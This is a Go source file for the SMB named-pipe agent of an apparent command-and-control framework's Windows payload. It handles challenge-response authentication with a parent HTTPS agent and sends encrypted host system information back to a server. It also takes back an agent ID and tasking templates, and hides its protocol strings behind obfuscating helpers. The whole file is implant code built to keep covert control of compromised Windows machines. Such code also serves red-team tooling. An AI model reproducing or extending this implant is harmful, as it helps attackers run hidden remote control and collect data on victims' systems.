// server/docker/payloads/SMB_Windows/auth.go
// Authentication and handshake for SMB agent

//go:build windows
// +build windows

package main

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"time"
)

// performAuth performs lightweight authentication with the connecting HTTPS agent
func performAuth(conn *NamedConn) error {
	// Generate a random challenge
	challenge := make([]byte, 32)
	if _, err := rand.Read(challenge); err != nil {
		return fmt.Errorf("%s", ErrCtx(E19, err.Error()))
	}

	// Send challenge
	if err := conn.WriteMessage(challenge); err != nil {
		return fmt.Errorf("%s", ErrCtx(E11, err.Error()))
	}

	// Read response
	response, err := conn.ReadMessage()
	if err != nil {
		return fmt.Errorf("%s", ErrCtx(E10, err.Error()))
	}

	// Verify response format: should be AUTH prefix + challenge
	expectedPrefix := []byte(secVal(protoAuthPrefix))
	if len(response) != len(expectedPrefix)+len(challenge) {
		return fmt.Errorf("%s", Err(E2))
	}

	for i, b := range expectedPrefix {
		if response[i] != b {
			return fmt.Errorf("%s", Err(E3))
		}
	}

	for i, b := range challenge {
		if response[len(expectedPrefix)+i] != b {
			return fmt.Errorf("%s", Err(E3))
		}
	}

	// Send confirmation
	if err := conn.WriteMessage([]byte(secVal(protoAuthOk))); err != nil {
		return fmt.Errorf("%s", ErrCtx(E11, err.Error()))
	}

	return nil
}

// performHandshake performs the RSA+AES handshake with the server via the HTTPS agent
func performHandshake(conn *NamedConn, config map[string]string) error {
	// Collect system information
	sysInfo, err := collectSystemInfo(clientID)
	if err != nil {
		return fmt.Errorf("%s", ErrCtx(E19, err.Error()))
	}

	// Encrypt system info with RSA+AES (same as HTTPS agent handshake)
	publicKey := config["pk"]
	initSecret := config["sk"]

	encryptedPayload, err := encryptHandshakePayload(sysInfo, publicKey, initSecret)
	if err != nil {
		return fmt.Errorf("%s", ErrCtx(E19, err.Error()))
	}

	// Create handshake message to send through the HTTPS agent
	handshakeMsg := map[string]string{
		secVal(protoKeyType):    secVal(protoTypeHandshake),
		secVal(protoKeyPayload): encryptedPayload,
	}

	msgJSON, err := json.Marshal(handshakeMsg)
	if err != nil {
		return fmt.Errorf("%s", ErrCtx(E18, err.Error()))
	}

	// Send handshake through the pipe
	if err := conn.WriteMessage(msgJSON); err != nil {
		return fmt.Errorf("%s", ErrCtx(E11, err.Error()))
	}

	// Wait for handshake response
	// Set a timeout for the response
	responseChan := make(chan []byte, 1)
	errChan := make(chan error, 1)

	// Read messages in a loop, skipping ping/pong and waiting for handshake_response
	go func() {
		for {
			resp, err := conn.ReadMessage()
			if err != nil {
				errChan <- err
				return
			}

			// Check if this is a ping message - if so, respond with pong and continue waiting
			var msgCheck map[string]interface{}
			if err := json.Unmarshal(resp, &msgCheck); err == nil {
				if msgType, _ := msgCheck[secVal(protoKeyType)].(string); msgType == secVal(protoTypePing) {
					pongMsg := map[string]string{secVal(protoKeyType): secVal(protoTypePong)}
					pongJSON, _ := json.Marshal(pongMsg)
					conn.WriteMessage(pongJSON)
					continue // Keep waiting for handshake_response
				}
			}

			// Not a ping, send to response channel
			responseChan <- resp
			return
		}
	}()

	// Wait for response with timeout
	// 5-minute timeout to accommodate slow polling from parent HTTPS agent
	// The response must travel: SMB -> HTTPS -> Server -> HTTPS -> SMB
	// This can take 2-3 poll cycles of the HTTPS agent
	select {
	case response := <-responseChan:
		// Parse the response
		// NOTE: Parent agent sends "payload" (not "pl") for the payload field
		var respEnvelope map[string]interface{}
		if err := json.Unmarshal(response, &respEnvelope); err != nil {
			return fmt.Errorf("%s", ErrCtx(E18, err.Error()))
		}

		respType, _ := respEnvelope[secVal(protoKeyType)].(string)
		if respType != secVal(protoTypeHsResp) {
			return fmt.Errorf("%s", Err(E2))
		}

		// Decode and parse the signed response
		respPayload, _ := respEnvelope[secVal(protoKeyPayload)].(string)
		respBytes, err := base64.StdEncoding.DecodeString(respPayload)
		if err != nil {
			return fmt.Errorf("%s", ErrCtx(E18, err.Error()))
		}

		var signedResp VResp
		if err := json.Unmarshal(respBytes, &signedResp); err != nil {
			return fmt.Errorf("%s", ErrCtx(E18, err.Error()))
		}

		// Verify server signature
		if err := verifyServerSignature(&signedResp, publicKey); err != nil {
			return fmt.Errorf("%s", ErrCtx(E3, err.Error()))
		}

		// Update client ID
		if signedResp.NNID == "" {
			return fmt.Errorf("%s", Err(E4))
		}
		clientID = signedResp.NNID

		// Parse and store comms template if provided
		if signedResp.PCfg != "" {
			if tplData, err := base64.StdEncoding.DecodeString(signedResp.PCfg); err == nil {
				var ct PCfg
				if err := json.Unmarshal(tplData, &ct); err == nil {
					setCommsTemplate(&ct)
					// Initialize Windows common APIs now that template is available
					initWindowsCommonAPIs()
				}
			}
		}

		// Parse and store exec requirements template if provided
		if signedResp.RunCfg != "" {
			if tplData, err := base64.StdEncoding.DecodeString(signedResp.RunCfg); err == nil {
				var et RunCfg
				if err := json.Unmarshal(tplData, &et); err == nil {
					setExecReqTemplate(&et)
				}
			}
		}

		// Initialize secure communications with derived secrets
		secret1, secret2 := generateInitialSecrets(initSecret, sysInfo.DT.SD)
		secureComms = NewSecureComms(secret1, secret2)

		return nil

	case err := <-errChan:
		return fmt.Errorf("%s", ErrCtx(E12, err.Error()))

	case <-time.After(300 * time.Second):
		return fmt.Errorf("%s", Err(E6))
	}
}

// VResp represents the server's signed handshake response
type VResp struct {
	Status             string `json:"st"`
	NNID        string `json:"nc"`
	SInit bool   `json:"si"`
	Signature          string `json:"sg"`
	Seed               string `json:"seed"`
	PCfg      string `json:"ct,omitempty"`
	RunCfg    string `json:"et,omitempty"`
}
